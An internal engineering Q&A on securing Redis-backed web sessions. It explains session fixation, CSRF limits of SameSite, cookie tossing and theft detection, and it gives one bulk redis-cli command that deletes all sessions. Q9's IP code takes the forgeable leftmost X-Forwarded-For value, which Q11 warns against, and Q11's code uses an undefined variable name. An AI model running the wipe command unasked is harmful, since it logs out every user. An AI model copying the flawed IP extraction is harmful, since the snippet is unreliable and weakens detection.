**Session ID**: The value in the session cookie. An index into the server's session store (Redis). Meaningless without Redis — it's a random string that happens to map to session data.

**Session data**: Stored on the server (Redis). Contains: `user_id`, `roles`, `email`, `created_at`, `csrf_token`, etc. The client never sees this data directly. The client cannot modify it by manipulating the cookie.

**Why this matters:**
- **Forged cookie**: An attacker crafts any cookie value they want. The server looks it up in Redis → nil → 401. They cannot forge session data by modifying the cookie.
- **Compare to client-side sessions** (signed cookies like Flask's session with a weak secret): if the signing key is compromised, the attacker can forge arbitrary session data. Server-side sessions don't have this risk — the ground truth is always Redis.
- **Stolen cookie**: This IS a real threat. An attacker who steals the session cookie has the lookup key. `HttpOnly` prevents JavaScript-based theft; `Secure` + TLS prevents network interception.

---

### Q2: Why must you generate a new session ID after successful authentication? What is the attack called when you don't, and how is it executed?

**The attack: session fixation.**

**Execution without session ID rotation:**
1. The application creates a pre-auth session (to store CSRF token for the login form): Redis key `session:PRE_AUTH_ID` with anonymous state.
2. The server sends `Set-Cookie: session_id=PRE_AUTH_ID`.
3. An attacker, knowing or setting `PRE_AUTH_ID` as the victim's cookie (via subdomain cookie injection, URL parameter, or response header injection), tricks the victim into loading the login page with this ID.
4. The victim authenticates successfully. The server updates `session:PRE_AUTH_ID` with the victim's user data but keeps the same key.
5. The attacker, who already knew `PRE_AUTH_ID`, uses it in their browser. Redis returns the victim's session data. Attacker is authenticated as the victim.

**Correct behavior:**
On successful authentication:
1. Read any needed pre-auth state (CSRF token, redirect URL).
2. Delete the pre-auth session from Redis.
3. Generate a new, fresh session ID (CSPRNG).
4. Create a new Redis key with the new ID and the user's authenticated state.
5. Send `Set-Cookie: session_id=NEW_RANDOM_ID` in the response.

The pre-auth ID is now gone. Even if an attacker knew it, a lookup returns nil.

---

### Q3: Redis is down. What happens to your session-based authentication system? How do you handle this gracefully?

**What happens when Redis is down:**
- Login: Session write fails → login returns 503. Cannot complete login without a working session store.
- Authenticated requests: Session lookup fails → all requests appear unauthenticated → 401 or redirect to login.
- Logout: Session delete fails → user may appear still logged in (cookie still valid) until Redis recovers.

**Outcome:** Redis unavailability = complete authentication outage. All users effectively logged out during downtime. New logins fail.

**Options for handling gracefully:**

**Option A: Redis Sentinel (automatic failover):** Primary + 1-2 replicas. Sentinel monitors primary health. On primary failure: elects a new primary within 10-30 seconds. During failover: session writes fail; session reads may go to replica (stale). After failover: normal operation. Sessions written to old primary but not yet replicated are lost.

**Option B: Redis Cluster (sharding + HA):** 3+ master nodes, each with replicas. Single node failure affects only sessions on that node's hash slots (~1/3 of sessions). Remaining nodes serve the other 2/3 normally.

**Option C: Read-from-local-cache on Redis failure (circuit breaker):** Maintain an in-process LRU cache of recently validated sessions. On Redis failure: serve from local cache (staleness: up to `cache_TTL` seconds). New logins fail. Security risk: revoked sessions may continue to work during Redis outage.

**Option D: Dual-mode (sessions + short-lived signed tokens):** On login, issue both a session cookie AND a short-lived signed token (5-minute JWT). If Redis is unavailable, accept the signed token as authentication for 5 minutes. Operationally complex but improves resilience.

---

### Q4: What is the difference between an idle timeout and an absolute timeout for sessions? Why do you need both?

**Absolute timeout**: The session expires at `created_at + absolute_TTL`, regardless of user activity. A session created at noon with a 24-hour absolute TTL expires at noon the next day, even if the user was active 5 minutes ago.

**Idle timeout**: The session expires if there has been no activity for `idle_TTL` duration. Implemented as a sliding TTL — reset on each request.

**Why you need both:**

**Only idle timeout (no absolute):** An automated script keeping a session alive with background pings keeps a session alive indefinitely. An attacker who compromises a session at T+0 and maintains it with periodic pings never gets logged out.

**Only absolute timeout (no idle):** A session expires at a fixed time even if the user is actively using the app. A user filling out a long form gets logged out mid-task. An attacker who steals a session knows exactly how long they have.

**Both together:**
- Session expires after `absolute_TTL` from creation (e.g., 24 hours) — forces re-authentication daily.
- Session expires after `idle_TTL` of inactivity (e.g., 30 minutes) — limits exposure of unattended sessions.
- Whichever is shorter applies.

**Implementation:**
```python
if now - session["created_at"] > ABSOLUTE_TTL:
    invalidate_session(); return 401

if now - session["last_activity_at"] > IDLE_TTL:
    invalidate_session(); return 401

session["last_activity_at"] = now
redis.EXPIRE("session:" + session_id, IDLE_TTL)  # Sliding TTL in Redis
```

---

### Q5: How does `SameSite=Lax` on the session cookie affect CSRF attacks? In what scenarios is `Lax` still insufficient?

**`SameSite=Lax` prevents:** Cross-site POST, PUT, DELETE, PATCH requests. The most common CSRF attack vectors — the session cookie is not sent → unauthenticated → rejected.

**Scenarios where `SameSite=Lax` is still insufficient:**

**1. Cross-site GET with side effects:** `Lax` allows the session cookie on cross-site top-level GET navigations. If the application has a state-changing GET endpoint (bad practice but common in legacy apps), an attacker can embed `<a href="https://app.example.com/api/admin/delete-user?id=123">` and trick the victim into clicking it.

**2. Subdomain attacks:** `SameSite` considers same-site as same registrable domain (eTLD+1). `evil.example.com` and `app.example.com` are same-site — both are under `example.com`. An attacker controlling `evil.example.com` can make requests to `app.example.com` with the session cookie included.

**3. Browser bugs and legacy browsers:** Some older browsers treat unset `SameSite` as `None`. Always specify explicitly.

**4. OAuth / external redirects with POST:** Some OAuth flows use POST redirects from the IdP. If the session cookie is needed during the OAuth callback (cross-site POST), `SameSite=Lax` blocks it.

**Correct complete CSRF defense:** `SameSite=Lax` + CSRF tokens + `Origin` header validation. Defense in depth covers the gaps of each mechanism.

---

### Q6: How do you implement "remember me" (persistent sessions) securely?

**Mechanism:** Standard session cookie: no `Max-Age` → session cookie → deleted on browser close. Persistent session: `Max-Age=2592000` (30 days) → persists across browser restarts.

**The security risk:** A 30-day persistent session on a lost or shared device gives an attacker 30 days of access.

**Mitigation strategies:**

**1. Separate persistent session from regular session:** When "remember me" is selected: issue a long-lived, low-privilege persistent token (not a full session). When the persistent token is presented: issue a fresh short-lived (30-minute) regular session. The persistent token is used only to bootstrap new sessions, not to access the app directly.

**2. Persistent token rotation:** Every time the persistent token is used to create a new session, rotate it (invalidate old, issue new). Stored as a hash in DB:
```sql
CREATE TABLE persistent_sessions (
  token_hash CHAR(64) UNIQUE NOT NULL,  -- SHA-256(token)
  user_id UUID NOT NULL,
  issued_at TIMESTAMPTZ NOT NULL,
  expires_at TIMESTAMPTZ NOT NULL,      -- 30 days
  last_used_at TIMESTAMPTZ,
  device_fingerprint_hash CHAR(64)
);
```

**3. Device binding (soft):** Associate the persistent token with a device fingerprint (user agent hash + screen characteristics). Flag — but don't hard-reject — if used from a different fingerprint.

**4. Absolute maximum lifetime:** Even with continuous activity, the persistent session expires after 30 days absolute. Forces re-authentication monthly.

**5. Session management UI:** Show users all their active "remember me" sessions with location and device info. Allow revocation of specific sessions.

---

### Q7: How do you implement force-logout for all sessions of a specific user? What Redis data structures and commands are involved?

**Requirement:** Immediately invalidate all sessions for `user_id=uuid-abc123`.

**Data structures:**

```
Session data:
  Redis key: "session:<session_id>" -> {user_id, ...}  TTL: 86400

Per-user session registry:
  Redis key: "user_sessions:<user_id>" -> SET of session_ids
```

**At login time (session creation):**
```python
session_id = generate_session_id()
pipe = redis.pipeline()
pipe.set(f"session:{session_id}", json.dumps(session_data), ex=86400)
pipe.sadd(f"user_sessions:{user_id}", session_id)
pipe.expire(f"user_sessions:{user_id}", 86400 * 31)  # slightly longer than max session TTL
pipe.execute()
```

**Force-logout all sessions:**
```python
session_ids = redis.smembers(f"user_sessions:{user_id}")
pipe = redis.pipeline()
for sid in session_ids:
    pipe.delete(f"session:{sid}")
pipe.delete(f"user_sessions:{user_id}")
pipe.execute()
```

**For pathological cases (thousands of sessions):** Use `SSCAN` to iterate in batches (SMEMBERS is O(N)):
```python
cursor = 0
while True:
    cursor, members = redis.sscan(f"user_sessions:{user_id}", cursor, count=100)
    if members:
        redis.delete(*[f"session:{m}" for m in members])
    if cursor == 0:
        break
redis.delete(f"user_sessions:{user_id}")
```

**Cleanup of stale entries in the user_sessions set:** Session keys expire automatically. Set entries do NOT have TTLs — they remain even after the session key expires. A background job periodically removes stale members:
```python
for user_id in redis.scan_iter("user_sessions:*"):
    session_ids = redis.smembers(user_id)
    stale = [sid for sid in session_ids if not redis.exists(f"session:{sid}")]
    if stale:
        redis.srem(user_id, *stale)
```

---

### Q8: What is the difference between `Domain=app.example.com` and `Domain=.example.com` on a cookie? What are the security implications?

**`Domain=app.example.com`** (specific host): Cookie sent only to `app.example.com`. NOT sent to `api.example.com`, `evil.example.com`. Most restrictive; smallest attack surface. Use for single-origin applications.

**`Domain=.example.com`** (parent domain): Cookie sent to `example.com` AND all subdomains: `app.example.com`, `api.example.com`, `auth.example.com`, `evil.example.com`. Required for cross-subdomain SSO.

**Security implications of `.example.com`:**

**1. Subdomain compromise = cookie exposure for all subdomains:** If `marketing.example.com` is compromised (XSS or server compromise), an attacker receives the `.example.com` session cookie in every request to that subdomain.

**2. Cookie tossing from any subdomain:** An attacker controlling `evil.example.com` (user-generated content subdomain, subdomain takeover of an abandoned CNAME) can set cookies for `.example.com`, injecting fake session cookies into the victim's browser for all services under `example.com`.

**3. Subdomain takeover:** A DNS CNAME record for `old.example.com` pointing to a third-party service that no longer hosts the content → attackers claim the subdomain → they control `old.example.com` → they can set `.example.com` cookies.

**When to use `.example.com`:** Only when cross-subdomain SSO is an explicit requirement AND all subdomains are under strict control (no user-generated subdomains, no abandoned CNAMEs, no third-party services on subdomains).

**The `__Host-` cookie prefix (most secure for same-host use):**
```
Set-Cookie: __Host-session_id=...; Secure; Path=/; HttpOnly
```
NO `Domain` attribute allowed. The cookie is automatically scoped to the exact host. A subdomain cannot set or override a `__Host-` prefixed cookie.

---

### Q9: How would you detect that a session has been stolen and is being used simultaneously from two different locations?

**Detection signals:**

**Signal 1: IP address change within a session:**
```python
current_ip = request.headers["X-Forwarded-For"].split(",")[0].strip()
if session["last_ip"] != current_ip:
    if geo_distance(session["last_ip"], current_ip) > SUSPICIOUS_DISTANCE_KM:
        log_suspicious_session_ip_change(session, current_ip)
    session["last_ip"] = current_ip
```

**Signal 2: Concurrent requests from different IPs:**
```python
# After loading session:
recent_ip_key = f"session_ips:{session_id}"
redis.zadd(recent_ip_key, {current_ip: time.time()})
redis.expire(recent_ip_key, 10)  # keep last 10 seconds
recent_ips = redis.zrangebyscore(recent_ip_key, time.time()-10, time.time())
if len(set(recent_ips)) > 1:
    log_concurrent_session_use(session_id, recent_ips)
    # Optional: invalidate and force re-auth
```

**Signal 3: User agent change:** Storing a hash of the user agent at session creation and checking on each request. A session that switches from Chrome on Windows to Safari on macOS mid-session is suspicious. Use as a soft signal (browser updates cause false positives).

**Signal 4: Simultaneous login from two locations:**
```sql
SELECT login_at, ip_hash, ip_geo
FROM login_audit
WHERE user_id = $1
  AND login_at > NOW() - INTERVAL '10 minutes'
ORDER BY login_at DESC
LIMIT 5;
-- If two records show different countries -> suspicious
```

**Response to detected theft:**
1. Invalidate the session from both IPs.
2. Notify the user via email/SMS.
3. Force re-authentication.
4. If user reports it wasn't them: force password reset, audit all recent actions.

---

### Q10: A junior developer proposes storing session data in a signed cookie instead of Redis to eliminate the Redis dependency. What are the tradeoffs? When is this acceptable?

**Client-side sessions (signed cookies):** All session data is stored in the cookie itself. The cookie is signed (HMAC) or encrypted (AES-GCM) to prevent tampering. No server-side store needed.

Examples: Flask's `session` (signed with `SECRET_KEY`), Rails' `CookieStore`.

**Advantages:** No Redis dependency. Authentication never fails due to Redis outage. Zero latency for session data retrieval. Trivially horizontally scalable.

**Disadvantages:**

**1. Cannot revoke sessions:** The session data is in the cookie. If you need to log out the user, you clear their cookie client-side. But the signed cookie data is still valid — the attacker who stole the cookie can continue using it until expiry. There is no server-side "session is deleted" concept.

Workaround: Maintain a revocation list (blacklist) in Redis. But now you've re-introduced Redis for the revocation case — partially defeating the purpose.

**2. Cookie size limits:** Browsers limit cookies to 4096 bytes. A session with many roles, permissions, or arbitrary data may exceed this limit.

**3. Key compromise = all sessions compromised:** The signing/encryption key is the root of trust. If it leaks (config file, process listing), every user's session can be forged or decrypted. With server-side sessions, key compromise means the attacker can create new sessions but can't read or forge existing ones (the session data is in Redis).

**4. Stale data:** Roles and permissions embedded in the cookie are stale from session creation time. A user's roles change in the DB → their cookie still has the old roles until re-authentication. With server-side sessions, you can update the session data in Redis and the user immediately has new roles.

**5. Session data is visible (without encryption):** If using signing only (not encryption), the session data is base64-decoded and readable. Use encryption if data is sensitive.

**When client-side sessions are acceptable:**
- Stateless APIs that don't require revocation (e.g., internal tools where sessions are short-lived).
- Applications where key rotation and revocation are not required.
- Very high scale with simple session data (user ID + display name only).
- When Redis operational overhead is prohibitive for the team's skill level.

**Recommendation:** For production systems with revocation requirements, use server-side sessions (Redis). The revocation reliability and data integrity benefits outweigh the operational cost.

---

### Q11: Your application runs behind a load balancer that terminates TLS. How do you ensure the session cookie's `Secure` attribute is honored, and how do you properly reconstruct the client's real IP?

**The TLS termination problem:**
```
Client -> (HTTPS) -> Load Balancer -> (HTTP) -> App Server
```

The app server receives plain HTTP. Some frameworks won't set `Secure` on cookies when they detect a non-HTTPS connection. But the client receives HTTPS — the `Secure` attribute is correct and required.

**Solution: Trust the X-Forwarded-Proto header (from the load balancer only):**
```python
TRUSTED_PROXIES = ["10.0.0.0/8"]  # Only internal LB IPs

x_forwarded_proto = request.headers.get("X-Forwarded-Proto")
if request.remote_addr in TRUSTED_PROXY_RANGES:
    request.scheme = x_forwarded_proto or "http"

# Configuration: always set Secure regardless of detected scheme
SESSION_COOKIE_SECURE = True  # Always, unconditionally
```

**The X-Forwarded-For (XFF) problem:**
```
Client (1.2.3.4) -> CDN/LB (10.0.0.1) -> App Server
App receives:
  Remote-Addr: 10.0.0.1     (the LB IP -- useless for rate limiting)
  X-Forwarded-For: 1.2.3.4  (the real client IP)
```

An attacker can forge XFF. The correct client IP is the RIGHTMOST IP added by a TRUSTED component. The CDN always appends the real client IP (from its perspective) to the right. IPs to the left may be attacker-controlled.

**Correct XFF extraction:**
```python
def get_real_ip(request, trusted_proxy_count=1):
    xff = request.headers.get("X-Forwarded-For", "")
    ips = [ip.strip() for ip in xff.split(",")]
    # Rightmost `trusted_proxy_count` IPs are added by trusted proxies
    if len(ips) > trusted_proxy_count:
        return ips[-(trusted_proxy_count + 1)]
    return request.remote_addr

# With 1 trusted proxy (single LB):
real_ip = get_real_ip(request, trusted_proxy_count=1)
```

If there are 2 hops (CDN → LB → App): `trusted_proxy_count=2`.

**Why this matters for session security:** Rate limiting is keyed by real client IP. Using the LB's IP rate-limits ALL users simultaneously. Session anomaly detection (IP change) uses real IP — a naive XFF reader allows an attacker who forges XFF to masquerade as a trusted internal IP and bypass IP-based rate limits.

---

### Q12: What happens to active sessions during a zero-downtime deployment? How do you handle schema changes to the session data structure?

**Zero-downtime deployment (rolling update):**
```
Before: App v1 instances (3 total)
During: App v1 (2) + App v2 (1) running simultaneously
After:  App v2 instances (3 total)
```

During the transition, a user's requests may be served by v1 or v2. The session in Redis must be understood by both versions.

**The problem — session schema change between v1 and v2:**

v1 session: `{"user_id": "abc", "email": "user@example.com", "roles": ["user"]}`

v2 session adds `permissions` field: `{"user_id": "abc", "email": "...", "roles": ["user"], "permissions": ["posts:read"]}`

- If v2 reads a v1 session without `permissions` and throws `KeyError`: application error.
- If v1 reads a v2 session with `permissions` and crashes on unknown field: application error.

**Strategies:**

**1. Backward-compatible schema changes (preferred):** Always add new optional fields (never remove or rename required ones). New code (v2) handles missing new fields with sensible defaults. Old code (v1) ignores unknown new fields. Requires schema design discipline.

**2. Session versioning:**
```json
{"schema_version": 2, "user_id": "abc", "permissions": [...]}
```
Each app version reads `schema_version` and migrates the session data on read:
```python
def load_session(raw):
    data = json.loads(raw)
    version = data.get("schema_version", 1)
    if version == 1:
        data = migrate_v1_to_v2(data)
    return data
```
On first v2 access to a v1 session: migrate in memory, write back to Redis.

**3. Session invalidation on deploy (simple, disruptive):**
```
redis-cli --scan --pattern "session:*" | xargs redis-cli DEL
```
All users are logged out. Must re-authenticate after deployment. Acceptable for internal tools or maintenance windows. Not for consumer products.

**4. Dual-read period:** v2 supports reading both old and new format sessions for 1 session TTL (24 hours). After 24 hours, all old sessions have expired. v2 can stop supporting the v1 format.

**Best practice:** Treat the session as a loosely typed document. Always serialize with forward compatibility (ignore unknown keys). Always deserialize with backward compatibility (`data.get("new_field", default)`). Use schema versioning for breaking changes. Document the session schema and review it in deployment checklists.

---

*Document version: 1.0 | Classification: Internal Engineering | Author: Security Engineering*  
*This document contains security-sensitive architectural details. Handle as CONFIDENTIAL.*  
*Do not distribute externally or commit to public repositories.*
